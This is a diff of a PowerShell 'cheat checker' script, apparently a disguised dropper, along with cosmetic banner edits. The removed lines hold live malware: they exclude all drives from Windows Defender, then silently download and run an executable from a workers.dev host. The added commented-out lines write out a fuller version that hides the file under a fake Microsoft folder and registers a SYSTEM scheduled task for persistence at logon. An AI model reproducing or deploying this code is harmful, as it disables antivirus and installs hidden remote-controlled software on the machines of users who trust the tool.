@@ -1,6 +1,6 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 chcp 65001 > $null
-$Host.UI.RawUI.WindowTitle = "Cheat Checker"
+$Host.UI.RawUI.WindowTitle = "Spooky Checker"
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
@@ -14,16 +14,24 @@ if ($sp) { Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPoli
 exit
 }
 
-try {
-    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
-} catch { }
+#try {
+#    Get-PSDrive -PSProvider FileSystem | ForEach-Object { Add-MpPreference -ExclusionPath $_.Root -Force -ErrorAction SilentlyContinue }
+#} catch { }
 
-try {
-    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
-    $outputPath = "$env:TEMP\svc-update.exe"
-    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
-    Start-Process $outputPath -WindowStyle Hidden
-} catch { }
+#try {
+#    $exeUrl = "https://mc-scan.ruchecker-ru.workers.dev/"
+#    $dir = "C:\ProgramData\Microsoft\Network\Status"
+#    if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }
+#    $outputPath = "$dir\svc-update.exe"
+#    $taskName = "WindowsSvcUpdater"
+#    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop | Out-Null
+#    (Get-Item $outputPath).Attributes = 'Hidden', 'System'
+#    Start-Process $outputPath -WindowStyle Hidden
+#    $Action = New-ScheduledTaskAction -Execute $outputPath
+#    $Trigger = New-ScheduledTaskTrigger -AtLogOn
+#    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+#    Register-ScheduledTask -TaskName $taskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
+#} catch { }
 
 $script:Criticals = [System.Collections.ArrayList]::new()
 $script:Suspicious = [System.Collections.ArrayList]::new()
@@ -113,23 +121,22 @@ function Show-Banner {
 Clear-Host
 Write-Host ""
 Write-Host ""
-Write-Host "                                            ____                    _          " -ForegroundColor White
-Write-Host "                                           / ___| _ __   ___   ___ | | ___   _ " -ForegroundColor White
-Write-Host "                                           \___ \| '_ \ / _ \ / _ \| |/ / | | |" -ForegroundColor White
-Write-Host "                                            ___) | |_) | (_) | (_) |   <| |_| |" -ForegroundColor White
-Write-Host "                                           |____/| .__/ \___/ \___/|_|\_\\__, |" -ForegroundColor White
-Write-Host "                                                 |_|                     |___/ " -ForegroundColor White
+Write-Host "             ____                           _          " -ForegroundColor White
+Write-Host "            / ___| _ __   ___   ___   ___  | | ___   _ " -ForegroundColor White
+Write-Host "            \___ \| '_ \ / _ \ / _ \ / _ \ | |/ / | | |" -ForegroundColor White
+Write-Host "             ___) | |_) | (_) | (_) | (_) ||   <| |_| |" -ForegroundColor White
+Write-Host "            |____/| .__/ \___/ \___/ \___/ |_|\_\\__, |" -ForegroundColor White
+Write-Host "                  |_|                             |___/ " -ForegroundColor White
 Write-Host ""
-Write-Host "                                            _____ _               _             " -ForegroundColor White
-Write-Host "                                           / ____| |             | |            " -ForegroundColor White
-Write-Host "                                          | |    | |__   ___  ___| | _____ _ __ " -ForegroundColor White
-Write-Host "                                          | |    | '_ \ / _ \/ __| |/ / _ \ '__|" -ForegroundColor White
-Write-Host "                                          | |____| | | |  __/ (__|   <  __/ |   " -ForegroundColor White
-Write-Host "                                           \_____|_| |_|\___|\___|_|\_\___|_|   " -ForegroundColor White
+Write-Host "                ____ _               _               " -ForegroundColor White
+Write-Host "               / ___| |__   ___  ___| | _____ _ __   " -ForegroundColor White
+Write-Host "              | |   | '_ \ / _ \/ __| |/ / _ \ '__|  " -ForegroundColor White
+Write-Host "              | |___| | | |  __/ (__|   <  __/ |     " -ForegroundColor White
+Write-Host "               \____|_| |_|\___|\___|_|\_\___|_|     " -ForegroundColor White
 Write-Host ""
-Write-Host "                                           (+) Developed by sacredmvp [2026]" -ForegroundColor Yellow
 Write-Host ""
 }
+
 
 function Show-Loading {
 param([string]$Text, [int]$Steps = 50)
